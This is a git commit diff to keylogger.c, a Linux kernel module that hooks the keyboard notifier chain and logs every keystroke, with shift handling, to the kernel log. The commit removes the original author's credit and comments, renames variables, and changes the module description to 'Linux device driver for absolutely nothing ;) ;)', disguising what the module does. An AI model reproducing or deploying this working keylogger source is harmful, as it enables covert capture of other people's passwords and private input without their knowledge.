f1904b37e57a14b17adab467cd5c80f66c04ed63
victor <vgonz181@fiu.edu>
2017-12-06 10:58:47 -0800

    Modified keylogger.c

--- src/keylogger/keylogger.c
+++ src/keylogger/keylogger.c
@@ -1,19 +1,19 @@
-/*
- *  A keylogger module
- */
-#include <linux/module.h>	/* Needed by all modules */
-#include <linux/kernel.h>	/* Needed for KERN_INFO */
-#include <linux/init.h>		/* Needed for the macros */
-#include <linux/keyboard.h>     /* Needed for the notifier_block */
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/keyboard.h>
 #include <linux/semaphore.h>
 
-#define DRIVER_AUTHOR "Arun Narasimhan <arunp@live.com>"
-#define DRIVER_DESC   "A keylogger device driver"
-#define DRIVER_LICENSE "GPL"
+#define DRIVER_DESC   "Keylogger"
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Ponstars");
+MODULE_DESCRIPTION("Linux device driver for absolutely nothing ;) ;)");
+MODULE_VERSION("1.0");
 
 struct semaphore sem;
 
-static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
+static const char* NoShift[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                         "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                         "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                         "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
@@ -23,7 +23,7 @@ static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", 
                         "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                         "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
 
-static const char* keymapShiftActivated[] =
+static const char* YesShift[] =
                         { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                         "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                         "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
@@ -34,7 +34,7 @@ static const char* keymapShiftActivated[] =
                         "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                         "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
 
-static int shiftKeyDepressed = 0;
+static int UnpressedKey = 0;
 
 int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
 {
@@ -43,24 +43,23 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
     {
         if( param->value==42 || param->value==54 )
         {
-            //acquire lock to modify the global variable shiftKeyDepressed
+            //acquire lock to modify the global variable UnpressedKey
             down(&sem);
             if(param->down)
-                shiftKeyDepressed = 1;
+                UnpressedKey = 1;
             else
-                shiftKeyDepressed = 0;
+                UnpressedKey = 0;
             up(&sem);
             return NOTIFY_OK;
         }
 
         if(param->down)
         {
-            //acquire lock to read the global variable shiftKeyDepressed
             down(&sem);
-            if(shiftKeyDepressed == 0)
-                printk(KERN_INFO "%s \n", keymap[param->value]);
+            if(UnpressedKey == 0)
+                printk(KERN_INFO "%s \n", NoShift[param->value]);
             else
-                printk(KERN_INFO "%s \n", keymapShiftActivated[param->value]);
+                printk(KERN_INFO "%s \n", YesShift[param->value]);
             up(&sem);
         }
     }
@@ -76,11 +75,8 @@ static struct notifier_block keylogger_nb =
 
 static int __init init_keylogger(void)
 {
-    /* Register this module with the notification list maintained by the keyboard driver.
-    This will cause our "keylogger_notify" function to be called upon every key press and release event. This call is non-blocking.
-    */
     register_keyboard_notifier(&keylogger_nb);
-    printk(KERN_INFO "Registering the keylogger module with the keyboard notifier list\n");
+    printk(KERN_INFO "Registering the keylogger with the keyboard notifier list\n");
     sema_init(&sem, 1);
     return 0;
 }
@@ -93,7 +89,3 @@ static void __exit cleanup_keylogger(void)
 
 module_init(init_keylogger);
 module_exit(cleanup_keylogger);
-MODULE_LICENSE(DRIVER_LICENSE);
-MODULE_AUTHOR(DRIVER_AUTHOR);
-MODULE_DESCRIPTION(DRIVER_DESC);
-MODULE_SUPPORTED_DEVICE("Not machine dependent");
